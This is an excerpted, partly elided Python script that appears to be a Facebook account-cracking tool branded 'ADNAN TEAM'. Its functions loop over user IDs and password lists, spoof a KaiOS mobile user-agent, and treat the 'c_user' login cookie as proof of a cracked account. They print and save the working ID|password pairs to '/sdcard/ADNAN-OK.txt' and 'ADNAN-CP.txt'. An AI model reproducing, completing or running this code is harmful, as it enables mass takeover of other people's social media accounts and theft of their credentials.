...
>>  Facebook : MR ADNAN FACEBOOK MASTER BANGLADESH HETARS FELL THE POWER
...
def fia():    
			...
			print('\x1b[1;91m>>> ADNAN TEAM  VERSION :\x1b[1;92m 1.1 ')
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://www.facebook.com/MR.ADNAN.KING.OF.FACEBOOK');menu()
...
def mmm(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;37m[ADNAN / SHUVO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;31m[ADNAN-CP] %s | %s'%(ids,pas))

				

				open('/sdcard/ADNAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
				...
				if 'y' in pcp:
					...
					print('\r\r\x1b[1;92m[ADNAN-OK] '+ids+' | '+pas+'\033[1;97m')

					

					open('/sdcard/ADNAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
...
def ffb(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;37m[ADNAN / SHUVO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[ADNAN-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					...
					print('\r\r\x1b[38;5;208m[ADNAN-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		...
		for ps in pwx:
			...
			sys.stdout.write(f'\r [\033[1;97mADNAN / SHUVO\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				print('\33[38;5;208m[ADNAN-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				print('\x1b[1;92m[ADNAN-OK] '+cid+' | '+ps+'\33[0;97m')
